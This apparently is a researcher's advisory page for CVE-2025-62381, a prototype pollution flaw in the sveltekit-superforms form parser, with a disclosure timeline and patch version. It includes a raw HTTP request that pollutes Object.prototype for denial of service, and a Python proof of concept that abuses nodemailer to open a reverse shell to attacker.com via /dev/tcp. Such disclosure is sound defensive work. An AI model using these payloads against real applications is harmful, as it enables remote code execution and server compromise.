<!doctype html> <html lang=en > <meta charset=UTF-8 > <meta name=viewport  content="width=device-width, initial-scale=1"> <link rel=stylesheet  href="/libs/highlight/styles/base16/chalk.min.css" /> <link rel=stylesheet  href="/css/franklin.css" /> <link rel=stylesheet  href="/css/tufte.css" /> <link rel=stylesheet  href="/css/latex.css" /> <link rel=stylesheet  href="/css/adjust.css" /> <link rel=icon  href="/assets/favicon.png" /> <title>CVE-2025-62381</title> <div id=layout > <div id=menu > <ul> <li><a href="/">home</a> <li><a href="/about/">about</a> <li><a href="/ctf/">ctf</a> <li><a href="/research/">research</a> </ul> </div> <div id=main ></div> </div> <div class=franklin-content ><h1 id=cve-2025-62381 ><a href="#cve-2025-62381" class=header-anchor >CVE-2025-62381</a></h1> <h4 id=summary ><a href="#summary" class=header-anchor >Summary</a></h4> <p><code>sveltekit-superforms</code> v2.27.3 and prior are susceptible to a prototype pollution vulnerability within the <code>parseFormData</code> function of <code>formData.js</code>. An attacker can inject string and array properties into <code>Object.prototype</code>, leading to denial of service, type confusion, and potential remote code execution in downstream applications that rely on polluted objects.</p> <h4 id=details ><a href="#details" class=header-anchor >Details</a></h4> <p>Superforms is a SvelteKit form library for server and client form validation. Under normal operation, form validation is performed by calling the the <code>superValidate</code> function, with the submitted form data and a form schema as arguments:</p> <pre><code class="javascript hljs"><span class=hljs-comment >// https://superforms.rocks/get-started#posting-data</span>
<span class=hljs-keyword >const</span> form = <span class=hljs-keyword >await</span> <span class="hljs-title function_">superValidate</span>(request, <span class="hljs-title function_">your_adapter</span>(schema));</code></pre> <p>Within the <code>superValidate</code> function, a call is made to <code>parseRequest</code> in order to parse the user&#39;s input. <code>parseRequest</code> then calls into <code>parseFormData</code>, which in turn looks for the presence of <code>__superform_json</code> in the form parameters. If <code>__superform_json</code> is present, the following snippet is executed:</p> <pre><code class="js hljs"><span class=hljs-comment >// src/lib/formData.ts</span>
<span class=hljs-keyword >if</span> (formData.<span class="hljs-title function_">has</span>(<span class=hljs-string >&#x27;__superform_json&#x27;</span>)) {
	<span class=hljs-keyword >try</span> {
		<span class=hljs-keyword >const</span> transport =
			options &amp;&amp; options.<span class=hljs-property >transport</span>
				? <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">fromEntries</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(options.<span class=hljs-property >transport</span>).<span class="hljs-title function_">map</span>(<span class=hljs-function >(<span class=hljs-params >[k, v]</span>) =&gt;</span> [k, v.<span class=hljs-property >decode</span>]))
				: <span class=hljs-literal >undefined</span>;

		<span class=hljs-keyword >const</span> output = <span class="hljs-title function_">parse</span>(formData.<span class="hljs-title function_">getAll</span>(<span class=hljs-string >&#x27;__superform_json&#x27;</span>).<span class="hljs-title function_">join</span>(<span class=hljs-string >&#x27;&#x27;</span>) ?? <span class=hljs-string >&#x27;&#x27;</span>, transport);
		<span class=hljs-keyword >if</span> (<span class=hljs-keyword >typeof</span> output === <span class=hljs-string >&#x27;object&#x27;</span>) {
			<span class=hljs-comment >// Restore uploaded files and add to data</span>
			<span class=hljs-keyword >const</span> filePaths = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(formData.<span class="hljs-title function_">keys</span>());

			<span class=hljs-keyword >for</span> (<span class=hljs-keyword >const</span> path <span class=hljs-keyword >of</span> filePaths.<span class="hljs-title function_">filter</span>(<span class=hljs-function >(<span class=hljs-params >path</span>) =&gt;</span> path.<span class="hljs-title function_">startsWith</span>(<span class=hljs-string >&#x27;__superform_file_&#x27;</span>))) {
				<span class=hljs-keyword >const</span> realPath = <span class="hljs-title function_">splitPath</span>(path.<span class="hljs-title function_">substring</span>(<span class=hljs-number >17</span>));
				<span class="hljs-title function_">setPaths</span>(output, [realPath], formData.<span class="hljs-title function_">get</span>(path));
			}

			<span class=hljs-keyword >for</span> (<span class=hljs-keyword >const</span> path <span class=hljs-keyword >of</span> filePaths.<span class="hljs-title function_">filter</span>(<span class=hljs-function >(<span class=hljs-params >path</span>) =&gt;</span> path.<span class="hljs-title function_">startsWith</span>(<span class=hljs-string >&#x27;__superform_files_&#x27;</span>))) {
				<span class=hljs-keyword >const</span> realPath = <span class="hljs-title function_">splitPath</span>(path.<span class="hljs-title function_">substring</span>(<span class=hljs-number >18</span>));
				<span class=hljs-keyword >const</span> allFiles = formData.<span class="hljs-title function_">getAll</span>(path);

				<span class="hljs-title function_">setPaths</span>(output, [realPath], <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(allFiles));
			}

			<span class=hljs-keyword >return</span> output <span class=hljs-keyword >as</span> <span class="hljs-title class_">Record</span>&lt;string, unknown&gt;;
		}
	} <span class=hljs-keyword >catch</span> {
		<span class=hljs-comment >//</span>
	}
 }</code></pre> <p>This snippet deserializes JSON input within the <code>__superform_json</code>, and then performs a nested assignment into the deserialized object using values from form parameters beginning with <code>__superform_file_</code> and <code>__superform_files_</code>. Since both the target property and value of the assignment is controlled by user input, an attacker can use this to pollute the base object prototype. For example, the following request will pollute <code>Object.prototype.toString</code>, which leads to a persistent denial of service in many applications:</p> <pre><code class="julia hljs">POST /signup HTTP/<span class=hljs-number >1.1</span>
Host: example.com
User-Agent: Mozilla/<span class=hljs-number >5.0</span> (X11; Linux x86_64; rv:<span class=hljs-number >143.0</span>) Gecko/<span class=hljs-number >20100101</span> Firefox/<span class=hljs-number >143.0</span>
Accept: application/json
Accept-Language: en-US,en;q=<span class=hljs-number >0.5</span>
Accept-Encoding: gzip, deflate, br
Referer: http://example.com/signup
content-type: application/x-www-form-urlencoded
x-sveltekit-action: <span class=hljs-literal >true</span>
Content-Length: <span class=hljs-number >70</span>
Origin: http://example.com
Connection: keep-alive
Priority: u=<span class=hljs-number >0</span>
Pragma: no-cache
Cache-Control: no-cache

__superform_json=[{}]&amp;__superform_files___proto__.toString=&#x27;corrupted&#x27;</code></pre> <h4 id=poc ><a href="#poc" class=header-anchor >PoC</a></h4> <p>The following PoC demonstrates how this vulnerability can be escalated to remote code execution in the presence of suitable gadgets. The example app represents a typical application signup route, using the popular <code>nodemailer</code> library &#40;5 million weekly downloads from npm&#41;.</p> <p><code>routes/signup/schema.ts</code>:</p> <pre><code class="js hljs"><span class=hljs-keyword >import</span> { z } <span class=hljs-keyword >from</span> <span class=hljs-string >&quot;zod/v4&quot;</span>;

<span class=hljs-keyword >export</span> <span class=hljs-keyword >const</span> schema = z.<span class="hljs-title function_">object</span>({
    <span class=hljs-attr >email</span>: z
        .<span class="hljs-title function_">email</span>({
            <span class=hljs-attr >error</span>: <span class=hljs-string >&quot;Please enter a valid email address.&quot;</span>,
        })
        .<span class="hljs-title function_">min</span>(<span class=hljs-number >1</span>, {
            <span class=hljs-attr >error</span>: <span class=hljs-string >&quot;Email address is required.&quot;</span>,
        }),
    <span class=hljs-attr >password</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">min</span>(<span class=hljs-number >8</span>, {
        <span class=hljs-attr >error</span>: <span class=hljs-string >&quot;Password must be at least 8 characters long.&quot;</span>,
    }),
});</code></pre> <p><code>routes/signup/&#43;page.server.ts</code>:</p> <pre><code class="js hljs"><span class=hljs-keyword >import</span> { zod4 } <span class=hljs-keyword >from</span> <span class=hljs-string >&quot;sveltekit-superforms/adapters&quot;</span>;
<span class=hljs-keyword >import</span> { fail, setError, superValidate } <span class=hljs-keyword >from</span> <span class=hljs-string >&quot;sveltekit-superforms&quot;</span>;
<span class=hljs-keyword >import</span> { schema } <span class=hljs-keyword >from</span> <span class=hljs-string >&quot;./schema&quot;</span>;
<span class=hljs-keyword >import</span> nodemailer <span class=hljs-keyword >from</span> <span class=hljs-string >&quot;nodemailer&quot;</span>;
<span class=hljs-keyword >import</span> {
    <span class="hljs-variable constant_">MAIL_USER</span>,
    <span class="hljs-variable constant_">MAIL_CLIENT_ID</span>,
    <span class="hljs-variable constant_">MAIL_CLIENT_SECRET</span>,
    <span class="hljs-variable constant_">MAIL_REFRESH_TOKEN</span>,
} <span class=hljs-keyword >from</span> <span class=hljs-string >&quot;$env/static/private&quot;</span>;

<span class=hljs-keyword >export</span> <span class=hljs-keyword >const</span> actions = {
    <span class=hljs-attr >default</span>: <span class="hljs-title function_">async</span> ({ request }) =&gt; {
        <span class=hljs-keyword >const</span> form = <span class=hljs-keyword >await</span> <span class="hljs-title function_">superValidate</span>(request, <span class="hljs-title function_">zod4</span>(schema));

        <span class=hljs-keyword >if</span> (!form.<span class=hljs-property >valid</span>) {
            <span class=hljs-keyword >return</span> <span class="hljs-title function_">fail</span>(<span class=hljs-number >400</span>, { form });
        }

        <span class=hljs-comment >// &lt;insert other signup code here: DB ops, logging etc..&gt;</span>

        nodemailer
            .<span class="hljs-title function_">createTransport</span>({
                <span class=hljs-attr >service</span>: <span class=hljs-string >&quot;gmail&quot;</span>,
                <span class=hljs-attr >auth</span>: {
                    <span class=hljs-attr >type</span>: <span class=hljs-string >&quot;OAuth2&quot;</span>,
                    <span class=hljs-attr >user</span>: <span class="hljs-variable constant_">MAIL_USER</span>,
                    <span class=hljs-attr >clientId</span>: <span class="hljs-variable constant_">MAIL_CLIENT_ID</span>,
                    <span class=hljs-attr >clientSecret</span>: <span class="hljs-variable constant_">MAIL_CLIENT_SECRET</span>,
                    <span class=hljs-attr >refreshToken</span>: <span class="hljs-variable constant_">MAIL_REFRESH_TOKEN</span>,
                },
            })
            .<span class="hljs-title function_">sendMail</span>({
                <span class=hljs-attr >to</span>: form.<span class=hljs-property >data</span>.<span class=hljs-property >email</span>,
                <span class=hljs-attr >subject</span>: <span class=hljs-string >&quot;Welcome to $app!&quot;</span>,
                <span class=hljs-attr >html</span>: <span class=hljs-string >&quot;&lt;p&gt; Welcome to $app. We hope you enjoy your stay.&lt;/p&gt;&quot;</span>,
                <span class=hljs-attr >text</span>: <span class=hljs-string >&quot;Welcome to $app. We hope you enjoy your stay.&quot;</span>,
            });
    },
};</code></pre> <p>The following Python script then pollutes the base object prototype in order to achieve RCE.</p> <pre><code class="python hljs"><span class=hljs-comment >#!/usr/bin/env python3</span>

<span class=hljs-keyword >import</span> requests

RHOST = <span class=hljs-string >&quot;http://localhost:4173&quot;</span>
session = requests.Session()

r = session.post(
    <span class=hljs-string >f&quot;<span class=hljs-subst >{RHOST}</span>/signup&quot;</span>,
    data={
        <span class=hljs-string >&quot;__superform_json&quot;</span>: <span class=hljs-string >&quot;[{}]&quot;</span>,
        <span class=hljs-string >&quot;__superform_file___proto__.sendmail&quot;</span>: <span class=hljs-string >&quot;1&quot;</span>,
        <span class=hljs-string >&quot;__superform_file___proto__.path&quot;</span>: <span class=hljs-string >&quot;/bin/bash&quot;</span>,
        <span class=hljs-string >&quot;__superform_files___proto__.args&quot;</span>: [
            <span class=hljs-string >&quot;-c&quot;</span>,
            <span class=hljs-string >&quot;bash -i &gt;&amp; /dev/tcp/attacker.com/443 0&gt;&amp;1&quot;</span>,
            <span class=hljs-string >&quot;--&quot;</span>,
        ],
    },
    headers={<span class=hljs-string >&quot;Origin&quot;</span>: RHOST},
)

r = session.post(
    <span class=hljs-string >f&quot;<span class=hljs-subst >{RHOST}</span>/signup&quot;</span>,
    data={<span class=hljs-string >&quot;email&quot;</span>: <span class=hljs-string >&quot;me@example.com&quot;</span>, <span class=hljs-string >&quot;password&quot;</span>: <span class=hljs-string >&quot;usersignuppassword&quot;</span>},
    headers={<span class=hljs-string >&quot;Origin&quot;</span>: RHOST},
)</code></pre> <p><img src="https://github.com/user-attachments/assets/7b097187-7110-409a-915d-94782c15f597" alt=asdf  /></p> <p>In addition to <code>nodemailer</code>, the Language-Based Security group at KTH Royal Institute of Technology also compiles gadgets in many other <a href="https://github.com/KTH-LangSec/server-side-prototype-pollution">popular libraries and runtimes</a>, which can be used together with this vulnerability.</p> <h4 id=impact ><a href="#impact" class=header-anchor >Impact</a></h4> <p>Attackers can inject string and array properties into <code>Object.prototype</code>. This has a high probability of leading to denial of service and type confusion, with potential escalation to other impacts such as remote code execution, depending on the presence of reliable gadgets.</p> <h4 id=timeline ><a href="#timeline" class=header-anchor >Timeline</a></h4> <ul> <li><p>October 8 2025: Initial disclosure to Superforms</p> <li><p>October 13 2025: Triage and patch discussions with developer</p> <li><p>October 16: Patched released with version 2.27.4</p> </ul> </div> </div> </div> <script src="/libs/highlight/highlight.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script> <script src="/libs/highlight/rust.min.js"></script> <script src="/libs/highlight/csharp.min.js"></script> <script> hljs.highlightAll(); hljs.configure({ tabReplace: " " }); </script>